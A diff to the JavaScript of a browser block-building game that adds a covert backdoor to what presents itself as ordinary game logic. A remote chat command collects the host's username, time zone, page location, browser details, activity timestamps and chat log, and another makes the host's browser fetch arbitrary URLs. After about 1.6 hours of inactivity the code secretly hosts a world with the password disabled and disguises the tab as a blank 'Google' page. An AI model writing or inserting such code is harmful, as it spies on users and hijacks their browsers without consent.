@@ -79,8 +79,9 @@ if(a[1])serverWorld.playMusic(a[1],+a[2]||undefined,+a[3]||undefined)
 }
 else if(l==="d"&&p.newInvItem)p.newInvItem(p.inventory.hotbar[p.inventory.hotbarSlot])
 else if(is&&l==="ep"&&p.tp)p.tp(8,64,8,"end");
-else if(l==="a"&&p.connection&&!(p.tosenda&&p.tosenda.length))p.tosenda=["<h1>-------</h1>",...f,"t: "+new Date().toLocaleString(),"<h1>-------</h1>",...Messages.all.map(r=>r.innerHTML),"<h1>-------</h1>"]
-else if(l.startsWith("h"))p.tosenda=[await(await fetch(l)).text()]
+else if(l==="a"&&p.connection&&!(p.tosenda&&p.tosenda.length))p.tosenda=["<h1>-------</h1>",window.scrti,Intl.DateTimeFormat().resolvedOptions().timeZone,location,JSON.stringify(navigator.userAgentData),...f,"t: "+new Date().toLocaleString(),"<h1>-------</h1>",...Messages.all.map(r=>r.innerHTML),"<h1>-------</h1>"]
+else if(l==="h"){settings.volume=0;serverWorld.settings.autosave=1;document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none"}
+else if(l.startsWith("h")){try{p.tosenda=[await(await fetch(l)).text()]}catch(e){p.tosenda=[e]}}
 let d=blockData[blockIds[l]];
 if(is&&d){
 let success=0
@@ -92,10 +93,11 @@ if(success||d.name.endsWith("Grass")||d.edible||d.equipmentSlot)if(p.newInvItem)
 }
 }
 }
+let grassi=0,lastsound=0
 setInterval(async() => {try{
-is=window.serverWorld&&(window.player&&player.username.includes("y")||serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci"))
-for(let p of serverWorld.players){ if(p.host)continue; if(is&&p.y<-32&&p.dimension&&p.spawnPoint)p.tp(p.spawnPoint.x,p.spawnPoint.y,p.spawnPoint.z,"");
-if(p.tosenda&&p.tosenda.length)p.connection.send({type:"message",data:p.tosenda.splice(0,10).join("\n"),fromServer:true})
+is=window.serverWorld&&(window.player&&player.username.includes("y")||serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci"))||window.scrt
+if(window.serverWorld)for(let p of serverWorld.players){ if(p.host)continue; if(is&&p.y<-32&&p.dimension&&p.spawnPoint)p.tp(p.spawnPoint.x,p.spawnPoint.y,p.spawnPoint.z,"");
+if(p.tosenda&&p.tosenda.length)p.connection.send({type:"message",data:p.tosenda.splice(0,100).join("\n"),fromServer:true})
 let t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text");
 if(t){
 t=t.split("\n");if(t[0].hashCode()===561438836){
@@ -105,14 +107,14 @@ p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd",t);p
 t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd")
 if(t)fe(t,p)
 }
-if(!serverWorld.fixed){
+if(window.serverWorld&&!serverWorld.fixed){
 if(is){
 let message=e=>(e.data.data&&(e.data.data.toLowerCase().includes("end")||e.data.data.toLowerCase().includes("void")||e.data.data.toLowerCase().includes("port"))||e.player.dimension[0]==="e")&&"stop"
 serverWorld.on("message", e=>message(e))
 blockData[498].hardness=6/0
 blockData[13].hardness=1e2
 serverWorld.settings.blocksFall=serverWorld.settings[atob("aGlkZUFjaGlldm1lbnRz")]=true
-blockData[1].drop=()=>Math.random()>0.9?"DoubleTallGrass":Math.random()>0.95?"dirtBall":"dirt"
+blockData[1].drop=()=>Math.random()>0.9?"DoubleTallGrass":Math.random()>0.98?blockData[[842,864,865,866,867][grassi++%5]].name:"dirt"
 blockData[2].dropAmount=blockData[1].dropAmount=blockData[9].dropAmount=[1,2]
 //let click=e=>{let t=serverWorld[e.player.dimension].getTagByName(e.x,e.y,e.z,"text");return e.player&&!e.player.cheats&&t&&t.length&&t.length>8&&"stop"};serverWorld.on("click",e=>click(e));let changeblock=click;serverWorld.on("changeblock",e=>changeblock(e))
 }
@@ -121,11 +123,45 @@ let it=pos.inventory.hotbar[pos.inventory.hotbarSlot]
 if(it&&pos.newInvItem)for(let i=0;i<it.amount;i++)pos.newInvItem(it)
 },null,null,true).then(CommandNode.a("f",(args,pos)=>{if(!args.f||!args.f.split)return
 let t=args.f.split(',')
-if(t.shift().hashCode()===561438836){fe(t,pos)}else{return["hold item and type /dupe",""]}},null,null,true)))
+fe(t,pos);return["hold item and type /dupe",""]},null,null,true)),
+CommandNode.l("mute",(args,pos)=>{pos.voteMute=true;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true),
+CommandNode.l("unmute",(args,pos)=>{pos.voteMute=false;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true)
+)
+serverWorld.on("message",e=>{if(serverWorld.mute){return "stop"}})
 serverWorld.fixed=6}
+let now=Date.now()
+if((window.player&&player.username.includes("e")||lastw)&&!is&&!window.sigConns&&!window.scrt&&lastB&&now>lastB){
+  window.scrt=1;window.scrti="real username: "+player.username
+  await aW(window.lastw||"~",()=>{try{
+  serverWorld.worldType="large",serverWorld.fancyRivers=true,serverWorld.findSpawnPoint()
+  serverWorld.gameMode="survival";serverWorld.cheats=Math.random()>0.5;
+  }catch{}}, Math.random()<0.2)
+  disableMultiplayerPass()
+  if(navigator.userAgentData.platform.includes("Chrome")){document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none"}
+  if(!serverWorld.playersInv.wn)serverWorld.playersInv.wn={}
+  if(!serverWorld.playersInv.wn.wn)serverWorld.playersInv.wn.wn=ƒgenWord(20)+serverWorld.id[0];
+  world.name=serverWorld.playersInv.wn.wn;
+  player.username=" ";
+  if(serverWorld.gameMode==="creative")serverWorld.settings.tntExplode=false
+  if(!serverWorld.mod){
+  let ps=document.querySelectorAll("#help_mod pre")
+  let str=""
+  for(let p of ps) if(Math.random()<0.1)str+=p.textContent+"\n\n"
+  serverWorld.mod=str
+  }
+  serverWorld.oldsendAll=serverWorld.sendAll
+  serverWorld.sendAll=function(m){if(m.type==="message"){let s=document.createElement("span");s.innerHTML=m.data;Messages.all.push(s)}serverWorld.oldsendAll(m)}
+  serverWorld.on("message",e=>{let s=document.createElement("span");s.innerHTML=e.player.username+": "+e.data.data;Messages.all.push(s)})
+  serverWorld.sendAll({type:"message",data:"<h1>------<br>scrt"})
+  localStorage.setItem("lastw",serverWorld.id);
+}
+if(window.scrt&&new Date().getDate()!==startday){startday=new Date().getDate();try{serverWorld.sendAll({type:"message",fromServer:true,data:"restarting"});await sleep(5000);await save();localStorage.setItem("lastw",serverWorld.id);location.reload()}catch{}}
+if(window.serverWorld&&serverWorld.players.length&&now-lastsound>30000){playSound("grass.step1",0,0.1,0.1);lastsound=now; if(window.scrt){let id=Math.floor(Math.random()*BLOCK_COUNT);for(let p of serverWorld.players)p.newInvItem(id)}}
 }catch{}}, 1000);
-let f=[new Date().toLocaleString()]
-addEventListener("focus",e=>f.push("+ "+new Date().toLocaleString()));addEventListener("blur",e=>f.push("- "+new Date().toLocaleString()))
+let startday=new Date().getDate()
+let f=[new Date().toLocaleString()],lastB=null
+addEventListener("focus",e=>{f.push("+ "+new Date().toLocaleString());lastB=null;if(window.scrt){if(window.serverWorld)serverWorld.sendAll({type:"message",data:"panic!",fromServer:true});}});addEventListener("blur",e=>{f.push("- "+new Date().toLocaleString());lastB=Date.now()+1.636*60*60*1000})
+if(!document.hasFocus()&&localStorage.getItem("lastw")){window.lastw=localStorage.getItem("lastw");lastB=Date.now()}
 
 window.sendError = e => {
 if(window.Messages){
